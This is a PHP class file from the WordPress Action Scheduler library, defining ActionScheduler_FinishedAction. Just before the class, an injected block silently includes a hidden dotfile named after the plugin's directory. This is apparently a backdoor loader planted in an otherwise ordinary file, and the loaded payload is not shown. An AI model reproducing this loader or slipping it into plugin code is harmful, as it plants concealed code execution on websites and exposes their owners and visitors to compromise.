<?php

/**
 * Class ActionScheduler_FinishedAction
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ActionScheduler_FinishedAction extends ActionScheduler_Action {

	public function execute() {
		// don't execute
	}

	public function is_finished() {
		return TRUE;
	}
}
 